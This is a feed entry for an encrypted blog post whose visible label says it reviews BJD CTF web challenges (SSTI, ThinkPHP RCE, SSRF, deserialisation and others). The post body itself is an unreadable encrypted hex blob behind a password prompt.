      <link href="/2020/03/31/%E7%AC%AC%E4%BA%8C%E5%B1%8ABJD%20CTF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%8E%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0-Web/"/>
      <url>/2020/03/31/%E7%AC%AC%E4%BA%8C%E5%B1%8ABJD%20CTF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%8E%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0-Web/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">本篇文章主要是BJD CTFWeb题的总结与复现，涉及SSTI漏洞、ThinkPHP5.x版本代码执行漏洞、`.swp`文件、反弹shell、伪造HTTP请求头、REGEXP注入、原生类反序列化、和SSRF漏洞等。输入密码，才能查看文章哦！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="2ac219b2fc8491207d0256695a578b8169c84ead3dda77ca7164283c47ade553">ab8abc03b19798b7515c774c84099971bc82aa1de4cf7ea9f35db08b7a68261c61628b6254531f88a5dbcc3ff008039ac4f7a76f257a124bdd128c029d95295c3412935539f8a6c2dddf9681d0ab64f9363d28ba35bd7effe51cb1e1e3c17c506dd61f023dbd42bb2eb63e276d62d6c063d24fce82c8581cd7c93078734e7f65c9494c1aebcf2f31dcc61f8b86634f29fe5904bbe4d80a7d5bebb075f4ed6ef72fe31f0d7ecd88342d3a2877386149c2036f7c6e5585bf452f319e12cdd924fa0715c016690ec8dbe8ce55df9b57635402e5ddd516d684899e1f588092f83564b1864dec31572fbd8f94e2004c3363d411f5b45d0e8560cc2cf60b0856eb40f9cf7c08c2b08af0850e70a50f20bf898695138670fc37c374eafccb7124360d135538d62d2d06423ce2fdaed066060b8c50d8132d7ce6cf16ca37bcb4f9288221932bc913df7ea3b53f9675ca57992ae6d33ae29d449a24087132a25dafa8432e722fcdf7ef6a63355a5cb29678ce49599fa6ffa4cc6f9b2d190dce530d905ee5f947500aea2a3458570f5ebebdeae8a2875562f610eda57771060b445aca250dcaeddc51e087adde4c715e141d02e750a900fd86ec673e7507833d89f10415337f3856ac61d14b50b88aca636bcc197abc6ac0d2dcc7b504bed59dfea5f2909880bce2f8b9c65f692a8795b53932964d00d06f871992af12af86d6793042a775df134c4242b6c5d3fb9572040b0f81490a8af78c007e00fbb0f747b6ac0664327437e9951cf55941f3a5d6c10a3fa42cccbcb4bee41ed30509c9a898a910bbb0fbf5b4f30997cc5fc4ccb973c9f20aae70c64f74e9f0fa3b1239c0d10b16408d8a4b99eb72f5fac732ab0fa9448a1bc5fa7c6c95b96e9d3b11c7e544d1d3309e7470dd703a0a080ed2811b71ce68ee66910dc7ad4be037bf2649f92e94022a36a775b15646cc0973c602585c2786c64af9adcfec6c85d9afd5c5cdb4d6dcd55f09bbcc3d2cef1cf089a7c068235a9c7ab113dd811c8c808d41f3317f252a8067adc9222353fb3fa82ffea445e5edfc055aaa0e22d990819f8021b34d944a1f179319479da7ee8339e31b4140db0d0b508fb953d1718581693b00b47da5086538ea4a7e8fefa9c9d87d4d6947d93d306030e36e6b19be5f07e6742a02964aee5e33816b96f7a8e25523d4f5339285c23080b2b3cc2a060a7bd389891d182a2c65dd411b3aeb903e03cc98973b508c950fc4774cb51552193c9ffc6efa79c029b700b695625aec7a3a644e27fc1dc79591b25d73fac7e549568684929ea4304ef17e35ce373eb137fb9422c13f72fcd037a6c808b488f3de076f65f20d57ecd912127a6734ce7bcf5eae84fcd993baf12e7fdb86973879540fda0e78861b2d954e789f84c857e39d9bbc298db7cb90c8388a111db23527664d3e5e3d076e4abb505cd2d69257d4ca3d3ddf205cc5b3ff1db686eb21101fe2a4058b8e31362d58ae634661cb64ed7268fe66af00b81a3d28b86c1622d1cf9575b18afdd34628ebef5c686dd606b4e25377c0a9bd8548450518cebb6ef1f5f5b1eb04cfe587d7f52a1ffa9e0c9b69a582b47289271a5f14eaab624ef720d00536ec5fcb0f047bf25c778fe3872f76c58da7e70ced968e57779176115e53954f36eab8a6f18377d62f0b8a7bfc3343821936719a9780d83679df9aea41344b7b37cdef3586ffb6b87d18a23db0c564ebc11974bedd9f97d460f0938a58d43d6c42736bb45304e53a33b1dc9791c4e6e06561fefae83038bd69c3ee0fcbb01df04bcb426ce6758bcf0d6449a93e2bc1bb839cf4291e17d6810fec111cbe8acd5d4b4702d0ab2923f095efe9a19c50c5ce62cde245cba8377a97e532a58216cbc26f55884bbfb4361f20cf7ebc0498984e20b98436a63e36a850a07ff9464308dfcb0a79fa5ba2279efca0749c614299f0499d8e519b0f1e0337124200bdac9a18a6de45c1e941ca59e943c76dad4bcae1b378ff3c0d092f8b70e1101abeacdac969afaefe0373c80aed5a33aafc9876f17d787d0e49dca39144da750cdef1b0e272f5cea3034f5d0e5530206f40e21b87d329aa024df1e478c0f89791bda024b2f8471286393b397e8445ed2bf721ae25122b7aa81573cb1e0269a4c9cf6f3d2c24804222ae57d83e41d3afa150f0e37c024c7da541975f69f0add9a60f26ba29434921ebe87b045e2f0ced6ee9a93f4dc865fb6342977869f7870acd3b1d65e3c5e36a7281c8313401725b65fc7c5845696cff53a05a50cd1aec26c21de2d8fe9acf12cbd7b57c0388cfce3bcfc3e6f076e4ff49e2cfeb03393cf4f6bfe07b3209ab963010625be1c06658bce89639a259b594cbbd2bc70b8fadc0086cfbdefa7472b0155bda92672ce4573ecde3f32fd0e12f02c1371abcbf6c8b04d5acb6bbaa552364ee34597c2ed4035a185e698146a97bde06f78ffc1a395a2649d7f2642a29158dcab06fa51bccbb03dd0ade6b43cc63e0bde1ec99d4d689789514b3374a69fbffabed0c9fa99c0c7b2379f9247bec40c79cb0a3314f6795326bc0018cdf5094ae4c5cc5bdbe2ba0f538e993c8a28894fad9aeb08d0b7e0238edfefb239168a338fd7572904ddbcc18f8f4e2d171d1440627e6d9041ce7d65c81cd10ece228140ebecf68b8e52b4466c302a84419d3597c13c150641bb7ba41b67815b46837bd3cdd171029e14ec4992cbe6dd45678283d3069e2a9c60776e9073db7762a53cf10ea3295cbccf0b57e92d20690e106792d4e16ccea351ef874d8ac40cf71b0c7e7cde82bdb1b5b6f7c0a44bdc683175eed1090d9929944c13294793f6357dd041fa6f20aeb99a0c607c00585be3b17a5b4f243d836eca91104f69f60ec9c352e6af212e7eff5ed10ad61fb2cc938fce9f2865b7e8101a121ad0a3189e8dcf8924c7812c4a9351733189ec20cfd9580beb3ebede05b6efbb411d868c4c6139afe35015c8ec66a0f40cba89b7d2a23fd7e0ac14101fb9a5e71d111c49982c9451cb5f0ccd118ab78a05be40f87edec8570e583f3d19c5dc0ed63186e560f532d2b3fd099ce8b9fa07d90f71238fcd8e18cf857c62620f9b32512ff9bb83faad4290e4e02ae6205037dbc9ee9c09c5bb2037c91b9d962249a049c25f004167223bb431726d614e634f28f1e1459f28f8457df56541bcd0ea964aed6663763164c2051444d59a52255bf6ceff5c429d6bd1ddb606eb337b5f5d9b00a461c5902e34bc818a7a8873a78497b78a5da14f9053dda1117ec4b8d7886f8ba1c77b941ba2404fc869b7c2b22c41ac6d52793c689f46b04405d24ea12bed13e98d2bb952f8a4142b6486239e13bc72a9e1c126920e10d2e41d83fb319b70056491f43b1f0773a16c2a928979b7097ac3ae3297bfe5eee0366fba6d65b88e549dc11e6117696b4bd5c1ae2ae78620c46900030ff50901ab299721334680732608e701b84e5b084da35116dd663b742a810d3be3476012ac9a0da792ef538226e5d83e83f1991fd954e15185b76c98c0678bab86815eaa0b1e2060f06a8e0d658b0dd28df19bd4b8a4be763e4d8da570d386b6810fb8fdd5d6bac8ec311a6ad66dc9f982b55d5726ef5ad9992797da64378c72aa5fa8fef3cf2500d4b79e5c1a118f15f1d7fc737e56a61b9c7f236b4616eb547adcf8315afc27b57cec9781116b21fbbfa3fa342bf88e74094dc0df2211061638c386926a5169a82b669a6fe8f2ebf181c0e17c55e39465fad544e4cf4635b2be590ff8b0503aa0fd6a63695f42d971eea28a62d006b4cf65a43717db71f89294a852d704f1ac363b96ed5065dcb5ccba0ca406c54a2ae033c4cbfcc0b3e67ea9b9f6c411f5e6d793f8a6efff608a209aaeaa32e26106288bdbe4262c216c37d7835950bcd306e52a3945fe01099e779cb42397287f15df1fd98bd5a6569a4d4b9ecba28317d707e5ec806fb4ff94085ba29f0353cecd76a69b2fe4a63c1c5f87486c137e4d84846080a99232205fe349fa6eb27cbf42c07b6ad452370ff9e46dd44c87a8750b16d696a76e0a570bff645e7da78b69bf4f0e286471ea2eae6890a044784eef33e5a6e72d493a5e21adcbd44e65974c06b363b889661a6dc2b55e569af8afd280e4b7fe67d310113b83f7b9ce0941c4764076f2ff8683bec2662bf8de351414f55eadf76123e02ec95fe888ad791f3098bcc396c17a074ff344191645332e83f3fc7cbea01027b89190cea49e521da75ae2f64d6b350e017beb43103408fec7fbf40b4b28e987361378afed7aad4cd8785e794af457cb0ab3d7cc009ebb32b13a20f0b4d01ab4b70290e87ec7b06014d1efa6a0c520f92226a76426db454a96def08229ac769a8d50d8c284acf8d4eb113b37a05e93d6b53789d5887cbb74147c0d4240b707e85e12e583b71d6bee35df73192506d6566062c8a374eb40cd221600464cc4633e250368e2aca8a252b54e09f53e2f8e88e30b1dcc1222a7a154343c52d05c339543fd143cf374d75fd286326963bffd4155a2b2bf06eed6644f91837276e00eb76b36a72e459b25e83b7f7ac24fe546c6ce9032237055ab3c0f8cb7ff5610eaaa6ad5765dedf4335bc4252a2652d6a59d118d92503d79963fc6011b42396ce10cfe85c1c4e7e4aea708ffd662d1dc6feeb869ffed76fe3604054078505c9d8a48e8c927f1b85fe430f28a1a99c064a42bcb7a935d6db274d2f02269570e832b7d56c6b6b2ec70b3c2e31f4fcefdaa791a30347faa71257b003f1d1dd62bee19bdb08ee055d0b9d06f22255e9cfec3b245b911c2bccc31e9859938f902afc2cd82b3eafa622a84a4c77a7dff24776d8be7732ad0f62943d5650d875e61b6fcbf374159c6bc73b5f12c7df0b67d6de49a3e52006c807aa42f57002c6e63f93a95c273f5f196ae823cf3d760fe25bcf37d85c18d3e12c10c4a877d986107b0502c414dac1142a49d9ddaf5bb7723dc2ba5bb591fd883277bb39abff3a1a28e8d0a4c5215d66b6a513ee2a7eff3bd0e9e2d625f941b806e7e9456105cce402a8847b4ad878cc36f83af8a3c132060f66ddb698744ec068e8cd1e25f4c54f915ab24b058d4fc58dae5fd0557e32d231a89f5dab86df1cf20d4f5a5f77d0c7f4d67b58e55d632c506fcee177cc92b51114eea9b22211c7fbc880e83d327f52f11340c212dc8a3efe089b1679e452c477ad79f1102035482ad7bb1054efaf44369faf5b5ee2ea892312cb6868c5a44835f85dff8a26b4c938babb0bafc4ea951cb6df4cece06dcaaa85f775791b5a3878921c85f883dcd5abe35bec18f66eace17082f0b1d63dd6547f9af41b000ec23b942c841484ac1a1382455bb53018847dbc6e2cfd14dd95d80c104ebf22a0f1a926212c6a1a3b325c55f6d3a6ba7b174d8e5014a7d874fef6f23bc64f96198ea1e7ac02ec6ba6a94d0c7c58dbbf00dbcf912b1c474fc49350626f3c13973c71c6afd6bafb8e7d7aba0a69912b2d7f1f9cee10e9151fe8b944ca8398c06f79860cff30546aab47a60770ab688f93e0018eae3671b13f395e571d83f2c04deebece1199b635f4b78e07b1abc4bc10712a1b69469d9704b910ac82b9ae4ee1a3437ab7052be92575908df34bd5874c9ca5c6cce840b117ac566c28e1a687ec45b1c317e60988a018c4f1c6ab3118788be3e25e0935e5692aa6850e0151715928ab831353c94871323e71527543c019eaea499fb5e7fe3ee29f822c840c4f5e93d1386c21ca040125c9c8b175835170621abd45c567e309acc4e16efae4322420b48fc46707b72b0048720c8cfd47bc5273c37cb7f4bef626cee16ed4454d1355fc12a489181fe72ef9742ee5ee9b518f04b522e6286e00e94111d182be42396d1fa8aa6a086df75fb665fb850ea000b921b840c5ec826bd069699703f43622746718d54ee80bd42fab1991c5d5093be043029c9b0750224cd43b433ca6b93393f8b1ff2148d9ef66bd102eb084e2dd46a647b92815f4518a366c5cc73cfcde1ee985f8187a921f225f5c960fe487b1934b9b8bc84fe7a5537ecedd4b35539fbf96ab79d2504665cf20f938ad6e01294ac0910b1d11ba6c71adbfcd1aee76744678df6f39a33d4f50b26a6dc81e4d502efbe6420a816143a104a8e6be6f62d57c975aa4c45c92a358dda4425271136dd2202166581b70cdd52c765326ae7567ba1ff84bb96e8d222dd0956176856f133a0f9c8a626c24cc77d754a0c3062f34ec12d1d95ecf573e00d08d2b29165b15db8d3c048231a56465339703ce9d7d7c7923edf4c4252e4f39d7e60ee9329509a95005c9781d4767851235523061c6f0ce9204c12a41be9246d146ec5c03588711c4fa94e31a054d3359eaf97af31de50c5fcd40df799c8d8841a10b6e57a5fe32964db1661ee17ef8fa6e599b8ed02e6b5626315ad429b4cdbcb6b2d0a41458ccafb50c83043cd243186c118d9bcfa21a4f2bc388e9ac9553bd071d39363cfa5a8dcc600313870c9cfefd1a9a8dba23abc970b3b0034afeb83ca6d513b1b7f518a3c6c7a52cec3349b4c93aec178bf1ad7b3d737a181ff818d9497e8c7071253efb5f87db86c69e2d4ae7aeb6737110886caa8a365019539538cb49f4bdd8a785621fb1336eb7acfbb1ac7fb3b639e9e10a0f515480d92d2eef270f0c99ac47a2b10ee8b02227716d15bf085806bcff91a1f9fa6c217308d9ff2de91d541a687551d3ff78fd18dd29aca311d204184f8048a80686e8dfd2b8957686180c996c4c57fd8754b477d1f9a8d4a9dc5d84a70addcb4c5ec5365275e8b6b2b38415e821f57441bc2e112a5672f7799c314f510a244627e1b3a2f9345df78cb0ea28efeadc37fa3f990fcd0494146c1cbf54e2439705fe39f4b4f027641fd10d9d5a42df2070770c1b290b328c63905e7738e247fca474e02859ec616f4bb0bf2b3de62260a774a7675c17965a5316191b0c7d68728ee2849de003664c678be15a3282ceee16138956a24d5beb11624c5ecc5a41c66f8f1f7558895c9c608635677d6d53dd936be1d9d5b8b62e236acd825c642ca83da4cf49add736cae99f7d897a377b4916ce71b2ad34d33ae2f8bc78e3c8fad840766ef0dc056c59ba16b86060f1c3d122e8d34f2369e66d029f2635286946dd375e8dd4f701806ee4f2f3f17243d7587cdb6609e0198552cc4a1feffc58518b2815bc123f184fb869fb790a539131f46a535b9cb2553a80487c7f2385cc3d68b4bb2f6ac7fa8bc778c3917e1d41dcc49da8b62a8c48f78e76ac8be00bd5dd6061f7d24dc224e1ec766dac79965f6d446559736060f691bdfa0629a731456d98187b1837f505a5295c786d394611e3b794fa8318e921eee7f055d13165f9b9343a8f96c93091ea3153c7a208dc59be59bab77ccfc16908f6a432a69a69202cd0cf80988f0cbff92c90ba4418976a19963be59ce3417de373096c61dc19666248455401ccbf9c4ce294bbed2426996930cdce602afd335add74865c7849c26bffb980b47a53a219cb16edccf922d2ed1d95f89aa6e23efbd686a3eb9dadc970a7f0be37d36b0b25c4d1a07f259559340e61fa3e03ab676c10723f3eb32f661b842729271b6282ea94ef2314c085739b71b84924efd88cb7c147140a3efa4143f1b705a5fec9fc5f2ae82af543caa60e81df610fbb99e707475a6f96eb7445d4fe059a777bc6d2e929c44030fcabd3732307b0a4889fd24ac9fdc8e5abc2e1f96bbd72072f1882bf7a02ef629574eda05dc7a8636d9da4995415f63e43b5ca5413bf4aab0ccd61ddf2b2f1efa663ebf27b2d28ef4a32895c734e6c7d492bd381d6b9196fdb2ab62a231e5de2a364f54a2a061fef5eacae05ee1b019e94cd05e72138088341f4cf46d264b4d3411d909ce87d321e88ba475a01ecd73968747ddf584764489d230aaf27efa1b443499ac8049378d8a0aeb11ab643c8e1d95ebc4499d7fd95a29eb5997f9c613ec7cfd499806efaebefaab2b9d6291137ca298eb1251b5f24b94cb2f6c73141c1f5a5c2e4cb49e0f622ca6cd8cf901e98a71a058063cd33051698d039d7615e09b1de96f69481ec4250992f362e77e1d9fe3c98eba1fd58d8acd764334cc5ca2483ff2de5ed78246233846f4e923ea96cb9c492780ebe2d139881e4d174a46be5ea09dfb7afa2afa930ef261d5313f068b39250530bda0d4e96f8cbe936d37d7579a91ea174e938cbefd733d3ce97d292d5c0672d8e6e6a1ce501bd06dbcb0fb4befb2a2e94335af44a6c2f4d7411ca6045b6ce6534ed015cde476754d3db5d5fb18f902a73b435ad5298435213d2b00afb9ba6f76198abacb3292692946f3c0ffe71a2877c816a3eaebd3bf990ee09f630589ae3907550ab6277accaabe46eb81cd5064df05e2afcddde7491b65bfacfe9cb585f7ac947b41c1180975346fb3e019cba6523e74c2d7f015c79fbcc780bfc07ee8049029310f4a4c7ddfdd22f9a2cc95f850ed6331af1811bc521c1c1d8287bb2f7929d4551981d637fc5b8b414980831b45be5e7ea475c3a8ed076c89c020f9ba0fc4c478d3c0bc7694a87d9820c9a892633d4ff30d661cb4cb5b829ac9a8cad54d725020dbf6e41ad8f8995d54f151c2b44c2dbb3c0272ac7beb5543ac524992e7c03247617acbdee049ee30cfb8348b0f2324935e6358d34267693c559a9c166f7aefa5228d8aa79e35edf07b0f8d7851520eaa91b7c8c3612d053563e161b210c2b07211a75ef899acdb79780157ea311a24d1cbeedea29ee4c22f46c8decf23f09ce6c5c5229c07fff9c5f5dc434334052ed10418ce4f5a74ac5ba9c1fcfd8883f6e10db930a640b7c1c70af4078d73455273f625fef121da7ac3bb5dd7ddb8145e19d9830b7a3cb03873dff73fa6831971aad15d0aaa3e4d6dbb171751af1ebe77584d0ab20a205bfa35fba95e81b8718105a9b50e28ae0d36455d071a62961ffff48a8bf0cbe11e0d8c5df8b062c79a5c02fd92446301a1362e554ada9c8941b9f7fb77bc438e785786a0030f17cc1375cda142ea51daeb45baadf3174ca95487d89f82aae8b5651e32e15c0e8122b033707180f5bd7246200aa6d61b3bcb0d81b8db68479e54baa153a0cbe29e3f3c93e04e7978f0c727ecdf71309cce43ca40e71617d3effbce8027913ca3194cc8cd5f800a46da5f75fe13180791d1eaef6feff98e7a2a244deba48657f1e8288fd82b68550ffeceefde9f1c6440c45756e5099c6c311246b3c99ae0d2ec26bb21c46d3cd1be5598a7b30c86e7638d34e8f30f1d64813aad6221957033c4729b7d575c85100d028e71f57d28019e452617b4683805295370ff51f097bfab6f8aaf9ef62565243e0fb6cbfeb6e59aaabd20a39b28860ff945c17da5438aa2ab928feb0ff305399ecde0b229103a7500c602f7fbb06d6127ad24eeec40c96d5e46a89a2c0248636a820fb8e1b449ce8a14dc28d9f52556ef94121d52ca47c912a4088847e54b8aadf74efc0b2a16e3ca07afd4604e7bf1c209b0316472b6618a5e8f5a4fee28dfb8e077b38e6a5be6314733c2f4f0b93597691a60a63acfe25e4d793d64da136c2d925da2d0c3fd79564d3aea9222057e2f13a14d4bc6d5e5e71ad8b05019621dec24665bee6b9b8177b3b2126a92f599c32f5155b3a7a8d287960d02ce846ca877c82b33b7f3e39cf5ec82a03774727f54638f47bbacf4d8df047f31ea6095f414437986bc8dee9bdaa7ebfb53257585374515a4c1467687c02e0828f19a9a1328482ed048fa92453feb489d5ecf981de99a17d53af17d3c03103bff4b58986bbc396b87a06cc66a0fd1f1ac3a49515590be7afecdef75b0b67346a6b236f7b40771019cd0663e858800a307f43825c853320ce0eb9ce16fcb5632e36b224f8ece0a0559e03be787bac8bf1429776ad6d12d70763bb3c6435f537162cafbd73797e0bc9321e2e7547f970478e357e64f767abed4c053f1c8340d0c534fca55a4b0ec3a58cf255cdb7735dbae9c53287f2efb542d87b9737cff0580842103bf66d1f09e7a8150f583da390fe550701a7c1d277cad0a64cb6d7ebc44f05ff8da11c03a3f1908872f88e070819bf547a7af16eefad1d2031dd83b5324704758fc7e73c01be52e8ac6608b7771229045f5e5475b78b22a46314b502a22ee0fc5562baa990014295d669e11022d097eefdfc799d4947049023c7aba6b332c05e4a634c154f134496601b3ceea4254267ae255606212913b1d614580e558b3d09cf6ad6ee0f7fc4081df5316ffbae91da460e143731e3532d1d07ea25be5f42ce9e2b815081a94820daf9171c5dd2307ff04e80bb9cf1beaa3cf8f8b10d3ec812076e5b89344d1d50bdab984fef36fed87b5b7b566099b46821b17fe5ff5c01657517fc715313bf6da035e999a93ffbc2ad71e47adf620137b5483cbfbaa7ed7221e3dda451e5ae99baca9b8e9b7b7f2b551f244817a6343521dc7fbbbe669084bcb0b3ca29cecb46c30643bd1af584a2089edc417d4fe8981442c2e41965111db4981890dc9ac332c7f217a9df63816e3c4580b2525ea4cd6815c136eb3678d780e54c916e491b16eca7054849e29b04671e68326fbc29678cfb910eb6a32cee9e0408e459c987a12adb327600d044b41ab4492be05ec2b9c5f74e382f5252ddb600ddfbd9acc05381645742369420693d8eb599a8d6995b0b7c2ebb0dd67a9f657c87d5c957f10c086d4c1febe64f0f170327f66b95182a1f4396bd8554bdb3eaf2634735f66efd4baa412bae20c85827abae2965090570db0706a093814c1bd604bd007a46de29fe277359ae9ce128122a80c12c52bf13a00746d7b6b5d6070e0441c58aaa283cb3d09445cb9f76351d5151ad321e6f10b940cea0f14700c0705525737ef243a528310c83d8d186ec3f8ce08a42ece8b2d239867c8359e4cf5ba597ff07f306bc78378b84046cd452e0d723f8c5ee1e7660837b864ea2217de8c9d1782ff66409a7b92eb638ab9c6892356a25cbe102fd6f87f3436597127a7b3829e7ab9727c0b365454bfb6aa544306452a4a8e1d9b65aa47c07abbb7d15c70c58d2b299ca34fd582ea6e3dbbf7a63b4b4d322938a76e9188c8a10ac449bdc545275d63969f53e5be57dd5a076756f2f3be9d26a8dad8c6bbfe362a51dc59b727c150d7cfc136be17d814eefca5323f0ce378aaa95b86062925e724c303412899cee7e2a117e0e8e8fb9e4d753a7c0bdb44273a97f86f6cc7958f2d7d560bc0230b1b2b173ae286a8c86c88fb40130522a72d65023dc1ea3dcc8602ed9c3a9f67ef75929ebf8249840b745f6f3eacc312b3c11d458fc809283ce6333f4add19a18ec6e5806e031a17f43ee121fd42b8d8cf1fe824ae234d9aa7a94018a926f517aa7d66eb25f8168cc7fac8193b2e66db6e8b177664c21fbef49f7aa13dc47526feafd75fc19ab3a73b4e698b9048ecf3998c4d9c9aace19745c727dbbd6d3ef530f2c6b66edba96e10104572123084d589d373f1a0dbef4b2f702381d4f287f5345fa4cb5ca42ef57dd84fa7b82fbc377c257fa09b731150024aea7b39aaeaf48ed0141470b493cc7ae6aa969f1cb51117ae0877a4df150714efa4dd766896b2f00e4e9bf8d414aaefbd900812531969691576dc243d86d343aa6242a74817a328781408122c11a9a70e729dfc286d3b296b5d7f9cb61368a6e2374b7919dcdacb85d402beaa7a200138e4ca71faa7f5e9f3adaeaff2e7f7e94e306987326ed81480a10ec77321388156c37d121960e8155b45f374c1c2ccf6260afb8cda48ea63a4818264d9c86fe6d60e0a377287433ecf31a877fc14ab4add1837eb5c99452ae2d006d6d9c3b70a5753e82d460b481cf5e101698f19bb3702fe4ab7f094f9e9de00bca600b25d925a4d83b2d482a3fe7874a7f9bfcc2c2a55525dcc5d05841c2c0370e29b76639ba3f6735a4c19c13860ab34f3397962ad9cce37a92864f70cca6788135dcde3a686945bd20f8171c76e0f74b4d5295b891950eae075c75069adb5073871f8dcc4f7ed2a6529fd96cb67bb0d3e2ef606c95cbf983fb2c5972364ecf281baed7a7d641a6dadf3afa1a10b25e28d238ae31105c85e871d17f4635c865440fd4105b90385b94fab2cb53a396025ae3b54cae072ba6425fb3c8bcd9bc1a5176e0de63ae3b4e1ae8378373da78b2438f0d3aaadc3e8e2637514ae7d18540b1b2e4ec3a528775ab6524d684eb277fb6c5ab70d082a91f92c0036f5ec96941d41af7bf63cbc598fa8dbc40fcd0110308a65a1b576d4d8e861c831ada5273d0c92551be2d27a796662a5b0f2a2b0e99444d303117b82938690a6244a5f252c282cffd8ec40bd1e825e8e1ba1bc2b37678756d9f6cf5f2a8a3b21f6643665d5027464287631cbfc3c78d2e7876e1e688b4746775cf35ae23cb965a3bec68b848dcacedfd6b8bc7ec10e817168053a51d2226632473bf4f58d2497ac770148b04ab3392adf77c77f26ebd93cff06e23f875ba8348d07e91e46e52a70f931851c4bf35113a1490eb85f97ec736bf42682a6c1686df721010524764fa0f805e241d8e466aafb8d93f849aa6650b94c49b85cb3563017cba3c5b9126c92270cda988f7bfc1b94aa4954be37f20fb3c5426a2e4eaaa7becd24971025605b38f11eeb312ad288b24315d3bc4427c997c6c2e7589a2a2a66ceef2f766cb399243238e47f895ead31738baf405c71c7eef4b99b125463f3ba42b65715152fda2366c9f0b2343a9b6baae30e3dd434e5174983466065cf70a30c32a0bb32b436762fb74a4655c84f9390125f1dba1e241ec0d6bc1112526bd3306e97cbc8f413eb07875ed93d227f0672bd37dea78a96e66a6b90b194104dad0c9f47b4aa516fda8d2bd2137750054e558df206234aa92f414f2ad6c90b5b62a22f1ea8464dabea85dd3f1c87319b6f84fea4c1571efc1b04c3a4e01577e315c917540a9187658a2290b883fa3adb91d558369c2e2c65775091275c978a2e9d68c144f226735ecae138aa8738632568dd06bd8b9a3cc1a2b158625bdbbdfc083ad8ca086869a796e832f00dfc7571b1cc1c913363c7e5e2fff8b32b937afdb9340837125ca9968ad1386e31d04a5ffead84c66cb5a2fdf0a9ab1c5783d6f58227b777943e63de99ec0d1c0e00f4b686fdf64a2b687edbc9b71a2192977f777e41e1991d516e43d631b9d941f794cca0862ce1ea89cbb2f732ff0e556760341d668a649d12c17b4927dd13e397d6b32ed04c6b13889b65cf03cf728925ebea8a0230d9db0db880a518cbb27cbc7e81af18d12923cbe217dfa61581e45d06db2eadb03ce70e1054416b1c4bbf1b7bc1c61c689e45a15d6493777a921c49c2d8d74ac0f1b6ffcb5d007da15b651720867999cbcb1ce588d13dd1849f5fd7e1e87c7c74631aaac0a2f84d1c7911d8de9689609e093bb4ffa65846bdf090cfc2215e875b7963219391b05c6be6bed0e1484f1373d92e1260c9abdd64de05dac6e8a84227f06c45f8edd810b775639ea35a40be85a8950faf0b9ded2de45ff26bbeadd5770b945ea74ef1063ac1e6f70be4fc5471b0588599e6b6d5f561d2bcf7f54383abdb0a8795bf0f394884938d53c8022cf2844c01dd8b1861b3c7f91c889bd3ee13f286a74ed41f906b0090b115223d2e5a9a4be45fcbab27a78607b32378b3f720acbf6c7d59a913e141464fe670d8f4ccbde8eac589770c90e285425d336bd4e16dfbf6943ddbc2515dc79ef9f8a35cec1f30a65d71c0bec6b3ae393546d8b9eb8346910cf0551069fdfbec948656b596f29a3b0735555d729713e4072c5b80b29a3e6fa2a30492aa76eaf46dddb3f7bb8ace71698f9558671cc17a2da4a0bedb768be6677a2f48ef64e3ca6251a45cdeabad9df1f1fa56686279154230ffd2dd6677de887a66689d23fb8f6c6de45d9967b3fa83a55e473ac1d855f46f18dbfec49030ed12931f97203b0a4ea1475b72a6cddc35dd155fb353387238593f330f07ff9bedec6d77f550524155877d0556e4ca1f430426fbd163ae762db561974d1a5ea73c5d33b612b4378f90e3e9bf32450d9f8944ac44ecd2c57a6f9cfc264a445d9ed5052795adc11d4e7548f431e22a22ed0ba4a80aa3c5e3d89dc605aba43a6c863fabc6505e69fd725a00ba43842933519e8602e05bfa01937bfd77c7b7a88a090fcf13ad783f104c14cd68427a7ff1b9bbe701c98a9e520e1e220d36b24afb8144f5ad89cf3615bd4b03fb857dcb36cc692aa43ce19a86e3f0f75d1698471f0ba523891c71bbac81f7c18f43f8add2532dba363b2e1dd6c3714f3f84b02d802e2f47568133884027c310c538cd4aaa242aa819a18079867a3a5264818df4285dd263b95daa6a57c0e7dbf0e284d0405af087fadd17a32bc1b37b9f6acb1c7062e71660ef9531af96138dc179a83fb181ac7b1d952071c39e221f260a4c566e5fd61b10827fbcd678a4cbeaad6026e8f366141eaea7fb842834e6e4d15ecdba1420a1fbfda1e49f6d319a18f3945337676269c7d07a5a7a83c55681497c28bf542a7c65fc3cd4e8fa379850b5f0bed535627ead7a4a24d097ea581423162f116519753a681c32249d1e00869e9d523da8b2bfcee66720f9d6965cf60917c1d1605b9f18e57905e4c3a5fff6bd8d15b537a279bdbeb3f21776e20e6d4961c8a52be91593981ea1f14547fb0a9af7932b78656c6612806aca299e114a40d4adb7960a3d87d2284abe6398877b21769b615b2937c6cd93cac7f69d40191b4c31c6eefc132dcc824a09c084577dfbfa6e5d2a83713fe5d40ab1ae800ac2f4df89b1339315f07d7718051878f08326cf31f0e57727d29d96b9a7fb2a4efaf030f7bf02daa116cca5fb68e41df42f659fc8639c68e05f72862bea074be3223ac65537274af43e48ae5289d954d5fd91b4042be9cb3fdbcca775102d4da23df0174341f652eee0f448d302b3be2b2a045801bef17c1ebaa205cecb4d386a294fbb727cdc9ff76a271bc1be757d6f86e481fd6b2ddf038caea29140c1583e4225b7a4b991de193602b38e39e031703ac80d95c8abe2afc893f0d3234c8279b38aff2facc170d212a7094accfa11a633da666b99d0d649a8d704490325d3919322b0f6625cfdb403e49a6eba578b3d7f98c3923592b1c0d0bd64e522f74af4f1c29875e32cd9cfcf9b20039053f6c12b01b6d1d2ac8c525cd88d41200e8574837d7589d9fd4af69bfe20a514fa6ee41a38c4d13eff1029f8131002defae8f2d6a93214f37314b948ae03726c7b64223493b5288fc6b28c63c4d053f99802ee7ab2ade6d1adca68575d9fca61374f3fff1fe07887a859a08358ba592e4ce9fbbe25ff0a5be8d4b8b7b5ed54187c9634e2d7d8c738ce03a93f91c216b9981cbae1e9a0c59b469fbead7d3b9280b21dffe7c90cd98d7e98bf84b2af7022af09beba94d247fb7ad23687adeca229539a8ef23cd9008856712005fd3e4871302a29ea39cb88305a12704a5ed7bf95dda9620f0169a738638bc893b5c080adf70c83c6e5fe99aeb81a1b9a7fcb2352ae1716d1d31de093679c34d1554d4b77d59be49fd42e2a66c6504183d325aadbc24de